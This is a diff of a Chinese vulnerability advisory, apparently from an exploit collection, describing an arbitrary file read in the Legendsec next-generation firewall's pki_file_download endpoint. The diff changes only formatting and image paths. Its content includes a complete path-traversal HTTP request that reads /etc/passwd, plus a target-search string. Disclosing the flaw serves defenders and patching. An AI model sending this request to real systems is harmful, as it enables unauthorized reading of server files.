@@ -1,8 +1,8 @@
-# 网神 下一代极速防火墙 pki_file_download 任意文件读取漏洞
+# 网神 下一代极速防火墙 pki\_file\_download 任意文件读取漏洞
 
 ## 漏洞描述
 
-网神下一代极速防火墙 pki_file_download 存在任意文件读取漏洞，攻击者可以通过漏洞获取服务器上的任意文件
+网神下一代极速防火墙 pki\_file\_download 存在任意文件读取漏洞，攻击者可以通过漏洞获取服务器上的任意文件
 
 ## 漏洞影响
 
@@ -20,11 +20,11 @@ app="网神下一代极速防火墙"
 
 登录页面如下
 
-![](images/202202162229226.png)
+![](../.gitbook/assets/202202162229226.png)
 
 发送请求包
 
-```plain
+```
 GET /?g=pki_file_download&filename=../../../../../etc/passwd HTTP/1.1
 Host: 
 Connection: close
@@ -41,7 +41,4 @@ Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
 Cookie: __s_sessionid__=7rl7vvg1mlc00gf4pfmo74h0t7
 ```
 
-![](images/202202162229183.png)
-
-
-
+![](../.gitbook/assets/202202162229183.png)
